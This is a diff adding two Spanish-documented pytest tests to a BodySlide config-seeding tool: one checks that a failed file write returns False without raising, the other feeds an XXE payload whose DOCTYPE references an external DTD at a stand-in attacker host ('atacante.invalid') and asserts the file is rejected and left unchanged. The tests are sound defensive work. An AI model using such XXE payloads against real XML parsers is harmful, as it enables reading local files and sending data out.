@@ -219,6 +219,58 @@ def test_un_config_ilegible_no_aborta_la_corrida(tmp_path: pathlib.Path) -> None
     assert resultado is False
 
 
+def test_un_fallo_al_escribir_tampoco_aborta_la_corrida(tmp_path: pathlib.Path) -> None:
+    """La otra mitad del best-effort: la ESCRITURA (review CodeRabbit #433).
+
+    Los otros casos cubren la lectura/parseo. Si el ``write`` falla —disco lleno,
+    archivo tomado por el AV, permisos— el contrato tiene que ser el mismo:
+    ``False`` sin excepción, porque ``run_batch`` sigue llamando a esto antes del
+    spawn. Una regresión acá volvería a impedir CORRER BodySlide.
+    """
+    from unittest.mock import patch
+
+    exe_dir = tmp_path / "tools" / "BodySlide"
+    exe_dir.mkdir(parents=True)
+
+    with patch(
+        "sky_claw.local.tools.bodyslide_config.ET.ElementTree.write",
+        side_effect=OSError("disco lleno"),
+    ):
+        resultado = sembrar_config_de_bodyslide(
+            exe_dir=exe_dir,
+            game_path=tmp_path / "game",
+            output_root=tmp_path / "game" / "BodySlide_Output",
+        )
+
+    assert resultado is False
+
+
+def test_rechaza_un_config_con_referencia_externa(tmp_path: pathlib.Path) -> None:
+    """XXE por referencia externa ``SYSTEM``, la otra familia además de las entidades.
+
+    ``forbid_external``/``forbid_dtd`` la cubren, pero sin test la protección
+    depende de que nadie toque esos flags. Es la variante que exfiltra: apunta a
+    un recurso de red o del filesystem local.
+    """
+    exe_dir = tmp_path / "tools" / "BodySlide"
+    exe_dir.mkdir(parents=True)
+    original = (
+        '<?xml version="1.0"?>\n'
+        '<!DOCTYPE Config SYSTEM "http://atacante.invalid/x.dtd">\n'
+        "<Config><GameDataPath></GameDataPath></Config>"
+    )
+    (exe_dir / "Config.xml").write_text(original, encoding="utf-8")
+
+    resultado = sembrar_config_de_bodyslide(
+        exe_dir=exe_dir,
+        game_path=tmp_path / "game",
+        output_root=tmp_path / "game" / "BodySlide_Output",
+    )
+
+    assert resultado is False
+    assert (exe_dir / "Config.xml").read_text(encoding="utf-8") == original, "no se toca el archivo del usuario"
+
+
 def test_rechaza_un_config_con_entidades_xml(tmp_path: pathlib.Path) -> None:
     """Billion-laughs / XXE se rechazan sin sembrar (Bandit B314).
 
